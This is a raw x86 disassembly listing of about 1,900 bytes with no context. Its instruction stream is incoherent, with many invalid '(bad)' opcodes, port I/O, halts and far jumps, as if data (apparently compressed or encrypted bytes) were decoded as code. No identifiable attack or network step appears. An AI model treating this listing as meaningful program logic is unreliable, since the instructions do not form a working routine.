  42e822:	xchg   edx,eax
  42e823:	popa   
  42e824:	inc    ecx
  42e825:	inc    ebx
  42e826:	jnp    0x42e7d7
  42e828:	jns    0x42e82a
  42e82a:	or     eax,0x1edadd8e
  42e82f:	(bad)  
  42e830:	mov    ebx,0xda84b894
  42e835:	pmaxsw mm7,QWORD PTR [ecx-0x6964bf06]
  42e83c:	adc    eax,DWORD PTR [ebx+0x60]
  42e83f:	push   ebx
  42e840:	adc    DWORD PTR [edx+eiz*8],eax
  42e843:	inc    eax
  42e844:	fst    DWORD PTR [esp+eax*4+0x17]
  42e848:	jbe    0x42e893
  42e84a:	and    BYTE PTR [edx],al
  42e84c:	fimul  DWORD PTR [eax-0x70]
  42e84f:	mov    eax,DWORD PTR [edx+0x33]
  42e852:	loop   0x42e85c
  42e854:	sbb    dl,BYTE PTR [eax-0x30]
  42e857:	aam    0x94
  42e859:	jle    0x42e87d
  42e85b:	dec    ebp
  42e85c:	call   0xe1387e9b
  42e861:	xchg   edx,eax
  42e862:	inc    esp
  42e863:	and    edi,esi
  42e865:	loop   0x42e8a1
  42e867:	and    eax,0xa68ec2d7
  42e86c:	shr    ch,0x54
  42e86f:	test   al,0xfe
  42e871:	cmc    
  42e872:	out    0xea,al
  42e874:	imul   esp,ebx,0xffffffb3
  42e877:	sub    esi,0x9ca5f280
  42e87d:	lahf   
  42e87e:	ret    0x94a
  42e881:	test   al,0x66
  42e883:	mov    al,0x50
  42e885:	push   edx
  42e886:	dec    esp
  42e887:	pop    ebx
  42e888:	mov    bl,0xaa
  42e88a:	cwde   
  42e88b:	lock gs dec esp
  42e88e:	or     ah,BYTE PTR [ebx]
  42e890:	mov    eax,0x87a65952
  42e895:	push   eax
  42e896:	inc    edx
  42e897:	add    DWORD PTR [esi],ebp
  42e899:	cmp    al,0x32
  42e89b:	ss sbb al,0x20
  42e89e:	mov    WORD PTR [esi-0x64],ss
  42e8a1:	sbb    al,0x10
  42e8a3:	pusha  
  42e8a4:	cmp    ebx,edx
  42e8a6:	sbb    edi,DWORD PTR [eax]
  42e8a8:	mov    BYTE PTR [edx+0x0],cl
  42e8ab:	pop    edx
  42e8ac:	inc    eax
  42e8ad:	sub    BYTE PTR [esi+0x3b],ah
  42e8b0:	int    0x70
  42e8b2:	ins    BYTE PTR es:[edi],dx
  42e8b3:	sub    BYTE PTR [eax],ah
  42e8b5:	pop    ebx
  42e8b6:	fcomp  DWORD PTR ds:0x6aaa46bb
  42e8bc:	jp     0x42e83e
  42e8be:	shr    esi,1
  42e8c0:	(bad)  
  42e8c1:	push   eax
  42e8c2:	aas    
  42e8c3:	(bad)  
  42e8c4:	xchg   ebx,eax
  42e8c5:	pusha  
  42e8c6:	inc    ebp
  42e8c7:	xchg   ebx,eax
  42e8c8:	fwait
  42e8c9:	sub    al,0xe8
  42e8cb:	jg     0x42e8d1
  42e8cd:	test   al,0xd4
  42e8cf:	push   eax
  42e8d0:	pop    ebx
  42e8d1:	icebp  
  42e8d2:	inc    esp
  42e8d3:	sbb    BYTE PTR [esi+0x40],0x48
  42e8d7:	jb     0x42e88b
  42e8d9:	cdq    
  42e8da:	scas   al,BYTE PTR es:[edi]
  42e8db:	test   al,0xd
  42e8dd:	push   edi
  42e8de:	hlt    
  42e8df:	int    0x86
  42e8e1:	ja     0x42e944
  42e8e3:	sbb    dh,BYTE PTR [edx-0x79]
  42e8e6:	push   esp
  42e8e7:	rcl    esi,1
  42e8e9:	push   0xffffffa2
  42e8eb:	inc    esi
  42e8ec:	sub    DWORD PTR [eax+0x3b7e911a],0xa2a08f02
  42e8f6:	push   0x798ae908
  42e8fb:	fcmovbe st,st(6)
  42e8fd:	push   0x43424bb4
  42e902:	adc    BYTE PTR [edi+0x68],bh
  42e905:	fld    DWORD PTR [ecx+eiz*1]
  42e908:	mov    BYTE PTR [esi],ch
  42e90a:	or     ebx,DWORD PTR [eax+ecx*8]
  42e90d:	cmp    al,ch
  42e90f:	es or  al,0xd6
  42e912:	enter  0xea72,0xb1
  42e916:	or     BYTE PTR [esp+edi*1],dh
  42e919:	push   ebx
  42e91a:	xchg   BYTE PTR [eax],bl
  42e91c:	sbb    cl,dh
  42e91e:	sub    al,0xba
  42e920:	mov    dl,0x1a
  42e922:	test   al,0x1
  42e924:	call   0x1bd1b77d
  42e929:	shr    DWORD PTR [esi+0x62],0x1
  42e92d:	add    BYTE PTR [edx+0x23],al
  42e930:	call   0x4c37fa53
  42e935:	inc    edx
  42e936:	or     ebp,DWORD PTR [eax+ebp*4-0x27]
  42e93a:	or     bl,dh
  42e93c:	lock dec ecx
  42e93e:	jecxz  0x42e952
  42e940:	jb     0x42e8fe
  42e942:	adc    DWORD PTR [eax+0xe00662b],ebx
  42e948:	cli    
  42e949:	add    eax,0x6cbe6aac
  42e94e:	ss inc edx
  42e950:	or     al,bl
  42e952:	int3   
  42e953:	push   eax
  42e954:	aad    0x50
  42e956:	pusha  
  42e957:	jl     0x42e9b9
  42e959:	and    al,BYTE PTR [esi-0x3c7827e2]
  42e95f:	fcom   st(0)
  42e961:	push   eax
  42e962:	lock retf 0x4556
  42e966:	xchg   BYTE PTR ds:0x4c89ad46,bl
  42e96c:	sbb    al,0x4e
  42e96e:	xor    eax,0x8e492e54
  42e973:	dec    edx
  42e974:	(bad)  [eax-0x61]
  42e977:	mov    ebx,ds
  42e979:	jmp    0x8337:0xe0a6f7fc
  42e980:	or     bl,BYTE PTR ds:0xf0512ea3
  42e986:	push   eax
  42e987:	push   esi
  42e988:	mov    esp,0x2bd2ba9e
  42e98d:	call   0xc1e6f744
  42e992:	sbb    BYTE PTR [edx],cl
  42e994:	(bad)  
  42e996:	sub    al,ch
  42e998:	hlt    
  42e999:	xor    al,bl
  42e99b:	imul   ebp,DWORD PTR [eax+0x53],0xffffff8d
  42e99f:	sbb    bh,BYTE PTR [ecx+0x13]
  42e9a2:	push   esi
  42e9a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e9a4:	xchg   DWORD PTR [ebp-0x3d],esi
  42e9a7:	and    BYTE PTR [edx-0x2c],ch
  42e9aa:	out    dx,al
  42e9ab:	push   ebx
  42e9ac:	cmp    al,BYTE PTR [edx+0xa]
  42e9af:	add    eax,0x779d6ad0
  42e9b4:	jns    0x42e96e
  42e9b6:	xor    ah,al
  42e9b8:	iret   
  42e9b9:	and    al,0x2a
  42e9bb:	lods   eax,DWORD PTR ds:[esi]
  42e9bc:	xchg   ecx,eax
  42e9bd:	in     al,0x6
  42e9bf:	mov    dl,0xa4
  42e9c1:	sub    BYTE PTR [eax+0x32e20a],dh
  42e9c7:	imul   BYTE PTR [eax]
  42e9c9:	out    0x34,eax
  42e9cb:	cmp    al,0x89
  42e9cd:	mov    ch,0xb9
  42e9cf:	stos   DWORD PTR es:[edi],eax
  42e9d0:	cwde   
  42e9d1:	imul   BYTE PTR [eax]
  42e9d3:	fimul  DWORD PTR [esi-0xc7ab300]
  42e9d9:	mov    al,ds:0x14c0ade0
  42e9de:	fmulp  st(6),st
  42e9e0:	pop    eax
  42e9e1:	jl     0x42ea47
  42e9e3:	add    dh,dl
  42e9e5:	dec    esi
  42e9e6:	cdq    
  42e9e7:	leavew 
  42e9e9:	and    DWORD PTR [eax-0x556773b8],esp
  42e9ef:	inc    ebp
  42e9f0:	adc    ebx,DWORD PTR [eax+0x68]
  42e9f3:	cmp    BYTE PTR [esi+eiz*8],0xee
  42e9f7:	xchg   sp,ax
  42e9f9:	imul   BYTE PTR [ebp+0x60]
  42e9fc:	inc    ecx
  42e9fd:	nop
  42e9fe:	pushf  
  42e9ff:	addr16 popa 
  42ea01:	int3   
  42ea02:	push   0xc0f80022
  42ea07:	mov    al,ah
  42ea09:	hlt    
  42ea0a:	mov    dh,0x4a
  42ea0c:	inc    esi
  42ea0d:	push   eax
  42ea0e:	rcl    BYTE PTR [edx+ebp*2+0x3aa60452],1
  42ea15:	jp     0x42e9db
  42ea17:	sbb    ebp,DWORD PTR ds:0x1ad6813a
  42ea1d:	xor    eax,0xe15aedfa
  42ea22:	add    eax,0x11c17c24
  42ea27:	mov    BYTE PTR [edi-0x70],dh
  42ea2a:	and    DWORD PTR [esi+ebp*8],0xef7d0076
  42ea31:	mov    DWORD PTR [edi+0x549cd0a6],edx
  42ea37:	fist   WORD PTR ss:[edi-0x3e]
  42ea3b:	inc    edx
  42ea3c:	pusha  
  42ea3d:	rcl    BYTE PTR [edi+ecx*8-0x27],0x88
  42ea42:	aaa    
  42ea43:	push   ecx
  42ea44:	push   ebp
  42ea45:	mov    bl,0x55
  42ea47:	push   es
  42ea48:	mov    ds:0xf770163e,al
  42ea4d:	ror    bl,0xda
  42ea50:	shl    BYTE PTR [ebp-0x781b9ce3],0x1c
  42ea57:	test   BYTE PTR [edx],ah
  42ea59:	fsubr  QWORD PTR [ebx+0x5040a18c]
  42ea5f:	mov    al,0x8a
  42ea61:	adc    al,0xf6
  42ea63:	dec    eax
  42ea64:	jmp    0x42ea0c
  42ea66:	scas   al,BYTE PTR es:[edi]
  42ea67:	mov    ah,0x83
  42ea69:	mov    ch,0xc9
  42ea6b:	add    al,0xd8
  42ea6d:	add    al,0x33
  42ea6f:	cld    
  42ea70:	pusha  
  42ea71:	(bad)  
  42ea73:	inc    ebx
  42ea74:	(bad)  
  42ea75:	mov    ecx,0x47981730
  42ea7a:	js     0x42ea24
  42ea7c:	sbb    cl,BYTE PTR [ebp+0x3a3681a7]
  42ea82:	mov    WORD PTR [edi+0x20],fs
  42ea85:	ds sbb al,0xca
  42ea89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ea8a:	out    0x52,eax
  42ea8c:	cld    
  42ea8d:	scas   al,BYTE PTR es:[edi]
  42ea8e:	or     eax,0x101f1d05
  42ea93:	mov    ecx,0xd378530c
  42ea98:	repnz xchg ecx,eax
  42ea9a:	dec    ebx
  42ea9b:	or     ebx,DWORD PTR [edx]
  42ea9d:	push   cs
  42ea9e:	xchg   BYTE PTR [eax-0x32b54bc8],dh
  42eaa4:	lods   eax,DWORD PTR ds:[esi]
  42eaa5:	mov    ds:0x84541acb,eax
  42eaaa:	iret   
  42eaab:	in     al,0xd1
  42eaad:	pop    esi
  42eaae:	sub    al,0xaa
  42eab0:	inc    ebp
  42eab1:	bound  edx,QWORD PTR [eax]
  42eab3:	or     dl,BYTE PTR [eax-0x34]
  42eab6:	mov    esi,0xa12edb18
  42eabb:	add    eax,0x908d7190
  42eac0:	sahf   
  42eac1:	add    al,0x60
  42eac3:	jae    0x42eb29
  42eac5:	xor    ecx,DWORD PTR es:0x841a4b43
  42eacc:	pop    esi
  42eacd:	pop    eax
  42eace:	push   esp
  42eacf:	and    eax,0x1035a9c0
  42ead4:	inc    edx
  42ead5:	mov    eax,DWORD PTR [esi+0x28e5a1f]
  42eadb:	sbb    al,0x42
  42eadd:	rol    BYTE PTR [ebx],0x1c
  42eae0:	or     DWORD PTR [eax],esi
  42eae2:	aaa    
  42eae3:	test   DWORD PTR [edi+0x767fb8c4],eax
  42eae9:	faddp  st(5),st
  42eaeb:	pop    edx
  42eaec:	pop    ecx
  42eaed:	fmul   DWORD PTR [edx+0x5e39d4ec]
  42eaf3:	xchg   BYTE PTR [ecx-0x18],bl
  42eaf6:	cmc    
  42eaf7:	nop
  42eaf8:	rcl    BYTE PTR ss:[esi+ebp*2+0x50],1
  42eafd:	(bad)  
  42eafe:	adc    ch,cl
  42eb00:	lock add eax,0x66
  42eb04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb05:	hlt    
  42eb06:	inc    esp
  42eb07:	add    dl,al
  42eb09:	(bad)  
  42eb0a:	into   
  42eb0b:	stos   BYTE PTR es:[edi],al
  42eb0c:	mov    ds:0x468830b1,al
  42eb11:	sbb    eax,0xab5ad6c0
  42eb16:	cmp    al,0xe8
  42eb18:	dec    esp
  42eb19:	neg    BYTE PTR [edx-0x5f18e969]
  42eb1f:	lahf   
  42eb20:	push   eax
  42eb21:	adc    bh,BYTE PTR [esi-0x4ba32d0b]
  42eb27:	scas   eax,DWORD PTR es:[edi]
  42eb28:	int3   
  42eb29:	mov    al,ds:0x850c0a00
  42eb2e:	stos   BYTE PTR es:[edi],al
  42eb2f:	push   edx
  42eb30:	repnz pusha 
  42eb32:	les    edx,FWORD PTR [esi-0x1dfa7a2]
  42eb38:	sbb    BYTE PTR [ebx+0x8e83088],ch
  42eb3e:	mov    ds:0x6f3d1cad,al
  42eb43:	retf   0xfb33
  42eb46:	mov    ah,0x20
  42eb48:	lock push eax
  42eb4a:	push   0x7a
  42eb4c:	push   0x28ccc058
  42eb51:	mov    eax,ds:0x92403c55
  42eb56:	(bad)  
  42eb57:	fadd   QWORD PTR [ecx]
  42eb59:	inc    esi
  42eb5a:	retf   
  42eb5b:	aam    0xd1
  42eb5d:	shl    DWORD PTR [eax+0x14],1
  42eb60:	imul   ebp,DWORD PTR [esi+0x79],0x0
  42eb64:	enter  0x452a,0x86
  42eb68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb69:	and    al,BYTE PTR [ebp-0x1d83c118]
  42eb6f:	jg     0x42ebd9
  42eb71:	jbe    0x42eb1b
  42eb73:	ss mov ah,0x5b
  42eb76:	inc    eax
  42eb77:	push   edx
  42eb78:	enter  0x6214,0xba
  42eb7c:	js     0x42eb0f
  42eb7e:	pshufw mm0,QWORD PTR [ecx+0x2a],0xc2
  42eb83:	jbe    0x42eb45
  42eb85:	and    al,0x13
  42eb87:	adc    eax,0x2d328357
  42eb8c:	add    BYTE PTR [esi],ch
  42eb8e:	mov    esi,0x6d9a2a4b
  42eb93:	push   eax
  42eb94:	sar    BYTE PTR [ecx+ebx*4+0x54b2880a],1
  42eb9b:	inc    eax
  42eb9c:	leave  
  42eb9d:	lods   al,BYTE PTR ds:[esi]
  42eb9e:	dec    ebx
  42eb9f:	or     DWORD PTR [ebx+0x182717d8],ebp
  42eba5:	dec    esi
  42eba6:	xor    al,0x43
  42eba8:	push   0x96f0f688
  42ebad:	mov    WORD PTR [eax+0x68],fs
  42ebb0:	mov    edi,0x10a4a20d
  42ebb5:	pop    esi
  42ebb6:	inc    esp
  42ebb7:	sahf   
  42ebb8:	add    al,0x5
  42ebba:	fcom   st(5)
  42ebbc:	mov    dh,0x2b
  42ebbe:	push   cs
  42ebbf:	xor    BYTE PTR [ecx],0x46
  42ebc2:	sbb    esp,edi
  42ebc4:	call   0x9acc:0xc4325c3a
  42ebcb:	inc    esi
  42ebcc:	sti    
  42ebcd:	push   esp
  42ebce:	fistp  DWORD PTR [edx]
  42ebd0:	cmp    cl,BYTE PTR [esi+0x72]
  42ebd3:	xchg   edx,eax
  42ebd4:	in     al,0x46
  42ebd6:	xchg   BYTE PTR [esp+ebp*4],al
  42ebd9:	stos   BYTE PTR es:[edi],al
  42ebda:	adc    DWORD PTR [ecx-0x462b70fb],ecx
  42ebe0:	pop    edx
  42ebe1:	imul   esi,DWORD PTR ds:0xd05682e8,0xec2204da
  42ebeb:	adc    BYTE PTR [edi],ah
  42ebed:	dec    eax
  42ebee:	int    0x22
  42ebf0:	pop    ebp
  42ebf1:	int3   
  42ebf2:	or     ecx,esp
  42ebf4:	mov    bh,0x8a
  42ebf6:	fcomp  DWORD PTR [esp+edi*1]
  42ebf9:	cmp    al,BYTE PTR [esi+edi*1+0x0]
  42ebfd:	adc    esi,ebx
  42ebff:	fisub  WORD PTR [ebx]
  42ec01:	jp     0x42ebd3
  42ec03:	mov    dl,BYTE PTR [ebp+ecx*1-0x6e]
  42ec07:	(bad)  
  42ec08:	jle    0x42ebd8
  42ec0a:	jae    0x42ec34
  42ec0c:	pop    eax
  42ec0d:	pop    esp
  42ec0e:	retf   
  42ec0f:	pop    eax
  42ec10:	push   eax
  42ec11:	idiv   BYTE PTR [ebp-0x63a858fa]
  42ec17:	dec    ebx
  42ec18:	mov    WORD PTR [edi],ds
  42ec1a:	and    BYTE PTR [esi-0x36],dl
  42ec1d:	mov    fs,WORD PTR [eax+ebp*1+0xac0078b]
  42ec24:	xchg   eax,esi
  42ec26:	ficomp WORD PTR [ecx]
  42ec28:	jbe    0x42ec58
  42ec2a:	or     al,0xb5
  42ec2c:	stos   DWORD PTR es:[edi],eax
  42ec2d:	call   0xf1b:0xc61e00c4
  42ec34:	adc    al,0x53
  42ec36:	cs shr ah,0xcd
  42ec3a:	mov    eax,0xd8762474
  42ec3f:	push   cs
  42ec40:	or     eax,0x82516658
  42ec45:	(bad)  
  42ec46:	sbb    eax,0x6a34740
  42ec4b:	sub    eax,0xf76ee25a
  42ec50:	mov    dh,0xab
  42ec52:	jecxz  0x42ec9e
  42ec54:	mov    ds:0x4a6f12f7,al
  42ec59:	dec    ebp
  42ec5a:	mov    esi,DWORD PTR [esi-0x20]
  42ec5d:	adc    eax,0x64320d85
  42ec62:	cmp    al,dh
  42ec64:	mov    dl,0xc
  42ec66:	sbb    BYTE PTR [ecx+0x20de8441],ah
  42ec6c:	nop
  42ec6d:	push   es
  42ec6e:	push   eax
  42ec6f:	push   ebx
  42ec70:	mov    cl,0x82
  42ec72:	or     cl,dl
  42ec74:	mov    ch,0x58
  42ec76:	and    bh,BYTE PTR [eax]
  42ec78:	sbb    al,0x54
  42ec7a:	aaa    
  42ec7b:	into   
  42ec7c:	cld    
  42ec7d:	mov    dl,0x9c
  42ec7f:	bound  ebx,QWORD PTR [edx]
  42ec81:	pop    ebx
  42ec82:	lds    ebx,FWORD PTR [ebx+0xc285dc]
  42ec88:	mov    bh,0x4c
  42ec8a:	and    BYTE PTR [ebx+eiz*2-0x79776863],dl
  42ec91:	pop    es
  42ec92:	push   esp
  42ec93:	out    0x62,eax
  42ec95:	es push cs
  42ec97:	sbb    BYTE PTR [ebp+edx*1+0x0],al
  42ec9b:	mov    ah,0xd8
  42ec9d:	std    
  42ec9e:	test   BYTE PTR [eax+0x1a9c34e1],dh
  42eca4:	xlat   BYTE PTR ds:[ebx]
  42eca5:	in     eax,dx
  42eca6:	dec    esi
  42eca7:	jecxz  0x42ec9d
  42eca9:	add    DWORD PTR [esi+0x43],0xffffff83
  42ecad:	(bad)  
  42ecae:	push   eax
  42ecaf:	mov    WORD PTR [edx],es
  42ecb1:	mov    ah,ah
  42ecb3:	adc    bl,BYTE PTR [edx+0x66a09a9a]
  42ecb9:	lods   al,BYTE PTR ds:[esi]
  42ecba:	mov    ah,0x24
  42ecbc:	cs pop ebp
  42ecbe:	sbb    eax,0xffffff94
  42ecc1:	and    DWORD PTR [eax+ebp*2-0x7a],esi
  42ecc5:	xchg   edx,eax
  42ecc6:	mov    WORD PTR [esi+ecx*1],ss
  42ecc9:	mov    al,ds:0x9cd41cdf
  42ecce:	das    
  42eccf:	or     BYTE PTR [ebx+0x2e9b462a],bl
  42ecd5:	mov    ecx,0x40adca56
  42ecda:	pusha  
  42ecdb:	(bad)  
  42ecdd:	test   al,0x5e
  42ecdf:	push   0xffffffa8
  42ece1:	std    
  42ece2:	cs daa 
  42ece4:	ins    DWORD PTR es:[edi],dx
  42ece5:	imul   ebx,DWORD PTR [ebp+0x4d],0x34
  42ece9:	add    al,0x8
  42eceb:	mov    BYTE PTR [esi-0x80],dh
  42ecee:	mov    al,ds:0x965e7f2c
  42ecf3:	and    BYTE PTR [esi+0x1b],0xec
  42ecf7:	add    BYTE PTR [ebp-0x11],ch
  42ecfa:	out    dx,al
  42ecfb:	pop    esp
  42ecfc:	mov    dh,0xf1
  42ecfe:	hlt    
  42ecff:	dec    esp
  42ed00:	stc    
  42ed01:	pusha  
  42ed02:	mov    ah,0xd0
  42ed04:	hlt    
  42ed05:	mov    ds:0x78ff1a47,al
  42ed0a:	add    BYTE PTR [ebp+0x2334edd0],ch
  42ed10:	aad    0xa1
  42ed12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ed13:	add    BYTE PTR [esi-0x14],dh
  42ed16:	sub    BYTE PTR [edx+0x35b5c1b6],cl
  42ed1c:	mov    esp,0x21883a0f
  42ed21:	jp     0x42ed67
  42ed23:	lods   al,BYTE PTR ds:[esi]
  42ed24:	stc    
  42ed25:	mov    ch,BYTE PTR fs:[esi+0x62bc5d84]
  42ed2c:	jnp    0x42ecb6
  42ed2e:	shl    DWORD PTR [edx],cl
  42ed30:	jns    0x42ed52
  42ed32:	mov    al,0x3b
  42ed34:	cmp    ah,BYTE PTR [esi+eax*1]
  42ed37:	call   0x4844:0xac
  42ed3d:	mov    al,0xf1
  42ed3f:	add    BYTE PTR [eax+0x60],bl
  42ed42:	loop   0x42ed7a
  42ed44:	mov    esp,0x41f4e271
  42ed49:	lods   eax,DWORD PTR ds:[esi]
  42ed4a:	clc    
  42ed4b:	xchg   esi,eax
  42ed4c:	inc    eax
  42ed4d:	loop   0x42ed8e
  42ed4f:	into   
  42ed50:	(bad)  
  42ed51:	aad    0x8a
  42ed53:	add    al,0x94
  42ed55:	fnop   
  42ed57:	jge    0x42ed9a
  42ed59:	mov    WORD PTR [esi+0x6196613e],?
  42ed5f:	cmp    edx,DWORD PTR [esi+0x289a8a31]
  42ed65:	push   esp
  42ed66:	cmp    eax,DWORD PTR [edx]
  42ed68:	sub    dh,BYTE PTR [edi+esi*8+0x60822ae8]
  42ed6f:	xlat   BYTE PTR ds:[ebx]
  42ed70:	mov    edx,0x1352eb21
  42ed75:	xchg   esp,eax
  42ed76:	mov    ?,esp
  42ed78:	mov    eax,0xf05b77b7
  42ed7d:	dec    ecx
  42ed7e:	pusha  
  42ed7f:	jb     0x42eddc
  42ed81:	push   esi
  42ed82:	ja     0x42ed56
  42ed84:	repnz cmp DWORD PTR [eax+0x4052f010],ecx
  42ed8b:	inc    ecx
  42ed8c:	push   0x6e
  42ed8e:	dec    ecx
  42ed8f:	ds test al,0xc0
  42ed92:	cmp    ch,BYTE PTR [esi-0x17]
  42ed95:	lods   al,BYTE PTR ds:[esi]
  42ed96:	push   ebp
  42ed97:	dec    edx
  42ed98:	fmul   QWORD PTR [ebp-0x5a29df2c]
  42ed9e:	cwde   
  42ed9f:	fwait
  42eda0:	dec    esi
  42eda1:	out    0x84,al
  42eda3:	add    al,cl
  42eda5:	or     dh,BYTE PTR [ebp-0x28c2e9ba]
  42edab:	dec    esi
  42edac:	ins    BYTE PTR es:[edi],dx
  42edad:	push   esi
  42edae:	adc    eax,0xf7ad955
  42edb3:	sub    BYTE PTR [esi],al
  42edb5:	pop    ebx
  42edb6:	mov    esp,0x6bded83b
  42edbb:	inc    eax
  42edbc:	xor    al,0x85
  42edbe:	cdq    
  42edbf:	mov    eax,0x528ccb8
  42edc4:	adc    eax,0x6aaf6b35
  42edc9:	and    al,0x4d
  42edcb:	adc    BYTE PTR [edx],bh
  42edcd:	and    dl,dh
  42edcf:	icebp  
  42edd0:	in     al,dx
  42edd1:	rol    BYTE PTR [edx+eiz*8],0x83
  42edd5:	mov    ch,0x9a
  42edd7:	rcl    ebp,0xc0
  42edda:	add    eax,DWORD PTR [eax]
  42eddc:	loope  0x42ede9
  42edde:	sub    BYTE PTR [eax-0x64],bh
  42ede1:	imul   ecx,DWORD PTR [eax],0xffffff8a
  42ede4:	mov    edx,0xa6dfafa0
  42ede9:	shl    BYTE PTR [ebp+0x28],1
  42edec:	cwde   
  42eded:	cwde   
  42edee:	sbb    al,0xb8
  42edf0:	xchg   esp,eax
  42edf1:	mov    al,0x0
  42edf3:	sar    BYTE PTR [esi-0x30],1
  42edf6:	ss stos DWORD PTR es:[edi],eax
  42edf8:	add    BYTE PTR [ebx+edx*1],dh
  42edfb:	sub    BYTE PTR [edx+0x3624a886],cl
  42ee01:	cmp    eax,0xaae61f0a
  42ee06:	mov    cs,WORD PTR [edx]
  42ee08:	jl     0x42ed8c
  42ee0a:	mov    esi,DWORD PTR [ecx+0x56]
  42ee0d:	pop    ss
  42ee0e:	mov    al,0x10
  42ee10:	into   
  42ee11:	call   0x984d:0xa1e04d8
  42ee18:	xor    esi,edx
  42ee1a:	les    ebx,FWORD PTR [edx]
  42ee1c:	xchg   BYTE PTR ds:0x5d12cfb7,al
  42ee22:	fisttp DWORD PTR [esi+0x12c600b6]
  42ee28:	mov    ah,0xb8
  42ee2a:	sahf   
  42ee2b:	xchg   ebp,eax
  42ee2c:	rcl    BYTE PTR ds:0xd7882e81,cl
  42ee32:	sub    al,0xcf
  42ee34:	lock pop ecx
  42ee36:	les    esp,FWORD PTR [esi+0x6a]
  42ee39:	push   ss
  42ee3a:	gs out dx,al
  42ee3c:	push   0x68e8a51a
  42ee41:	js     0x42edd9
  42ee43:	cld    
  42ee44:	sub    al,BYTE PTR [edx]
  42ee46:	out    dx,eax
  42ee47:	not    ah
  42ee49:	ret    
  42ee4a:	inc    esi
  42ee4b:	inc    edi
  42ee4c:	imul   esp,DWORD PTR [edx+ebx*2+0x29542dca],0xffffffd8
  42ee54:	jo     0x42ee96
  42ee56:	mov    eax,ds:0x6036bfae
  42ee5b:	clc    
  42ee5c:	dec    ebp
  42ee5d:	jg     0x42ee76
  42ee5f:	adc    al,0x5d
  42ee61:	inc    edx
  42ee62:	mov    ds,ebp
  42ee64:	push   0x3f669050
  42ee69:	add    BYTE PTR [eax],dh
  42ee6b:	sbb    cl,BYTE PTR [edi-0x3136053a]
  42ee71:	(bad)  
  42ee72:	sbb    al,BYTE PTR [ecx-0x256ced75]
  42ee78:	les    ebp,FWORD PTR [eax+0x7cd61002]
  42ee7e:	lds    ebx,FWORD PTR [eax]
  42ee80:	add    BYTE PTR [ecx-0x48],dh
  42ee83:	(bad)  
  42ee84:	or     dl,BYTE PTR [esi]
  42ee86:	dec    ebp
  42ee87:	or     dl,BYTE PTR [ebp-0x4dd9ee54]
  42ee8d:	push   ss
  42ee8e:	adc    DWORD PTR [ecx+0x4],esi
  42ee91:	mov    ch,0x5
  42ee93:	mov    ds:0xdb88aa5b,al
  42ee98:	in     al,0x76
  42ee9a:	xor    eax,0x3456c159
  42ee9f:	ins    BYTE PTR es:[edi],dx
  42eea0:	retf   0xfb61
  42eea3:	xor    BYTE PTR [esp+eax*1-0x60946636],al
  42eeaa:	add    al,0x16
  42eeac:	fiadd  DWORD PTR [edi+esi*4]
  42eeaf:	clc    
  42eeb0:	mov    eax,0x34f463c4
  42eeb5:	pop    edx
  42eeb6:	inc    ecx
  42eeb7:	inc    ecx
  42eeb8:	cmp    BYTE PTR [edx+0x5e],dh
  42eebb:	ins    BYTE PTR es:[edi],dx
  42eebc:	mov    esi,0xad88594
  42eec1:	sbb    bl,BYTE PTR [esp+ebx*4-0x38]
  42eec5:	push   edi
  42eec6:	jle    0x42eeb3
  42eec8:	push   ss
  42eec9:	pop    es
  42eeca:	test   al,0x86
  42eecc:	dec    ebp
  42eecd:	add    dh,dl
  42eecf:	mov    esp,0x447d818e
  42eed4:	and    eax,0x77a9f120
  42eed9:	hlt    
  42eeda:	or     BYTE PTR [edx+0xb],ah
  42eedd:	ret    0xd826
  42eee0:	stos   BYTE PTR es:[edi],al
  42eee1:	and    DWORD PTR [edx-0x16],ecx
  42eee4:	mov    eax,0xd435139b
  42eee9:	ss cmp al,0x4e
  42eeec:	xor    BYTE PTR [edx],0x4f
  42eeef:	jne    0x42ef13
  42eef1:	add    esi,edx
  42eef3:	adc    BYTE PTR [esi+0x64b48f8e],dh
  42eef9:	rol    BYTE PTR [eax+eax*2+0x58],cl
  42eefd:	pop    ss
  42eefe:	xchg   ebp,eax
  42eeff:	cwde   
  42ef00:	mov    dl,0xcf
  42ef02:	mov    al,ds:0xd434e1ec
  42ef07:	fadd   DWORD PTR [edi+0x715bcdb5]
  42ef0d:	push   0xffffffde
  42ef0f:	loop   0x42ef11
  42ef11:	int3   
  42ef12:	xor    bh,BYTE PTR [edx]
  42ef14:	pop    esi
  42ef15:	or     edx,edi
  42ef17:	neg    ch
  42ef19:	inc    esi
  42ef1a:	inc    ebp
  42ef1b:	inc    ebx
  42ef1c:	mov    ds:0x9764f380,al
  42ef21:	inc    esp
  42ef22:	in     eax,0x22
  42ef24:	mov    dh,0x67
  42ef26:	add    edx,esp
  42ef28:	pop    esi
  42ef29:	les    ebp,FWORD PTR [ebp+0x68433437]
  42ef2f:	(bad)  
  42ef30:	xor    BYTE PTR [edx-0x30],dh
  42ef33:	inc    edi
  42ef34:	(bad)  
  42ef35:	pop    esp
  42ef36:	(bad)  
  42ef37:	arpl   WORD PTR [ebx+0x33],bp
  42ef3a:	xchg   edx,eax
  42ef3b:	cli    
  42ef3c:	loopne 0x42efa4
  42ef3e:	inc    esi
  42ef3f:	(bad)  
  42ef41:	cli    
  42ef42:	add    cl,dh
  42ef44:	or     eax,edx
  42ef46:	add    ah,BYTE PTR [ecx+0x58]
  42ef49:	mov    ebx,0x2b5be291
  42ef4e:	cmp    BYTE PTR ds:0x373a6ddc,ah
  42ef54:	jns    0x42ef56
  42ef56:	push   esi
  42ef57:	push   esp
  42ef58:	fs enter 0xc522,0x7
  42ef5d:	pusha  
  42ef5e:	stos   DWORD PTR es:[edi],eax
  42ef5f:	cmp    esi,DWORD PTR [edx-0x3177462d]
  42ef65:	adc    BYTE PTR ds:0x52118acd,dl
  42ef6b:	inc    ecx
  42ef6c:	fldenv [esi]
  42ef6e:	push   0x40
  42ef70:	ror    DWORD PTR cs:[edx+0x3438b60b],0xfa
  42ef78:	xchg   edi,eax
  42ef79:	in     al,0x44
  42ef7b:	nop
  42ef7c:	inc    esp
  42ef7d:	pop    es
  42ef7e:	test   ah,dh
  42ef80:	cmp    esp,DWORD PTR es:[ebp+ecx*8-0x6e71f94]
  42ef88:	je     0x42efa6
  42ef8a:	xor    edx,ebp
  42ef8c:	adc    ebx,DWORD PTR [edx+0x60]
  42ef8f:	scas   eax,DWORD PTR es:[edi]
  42ef90:	nop
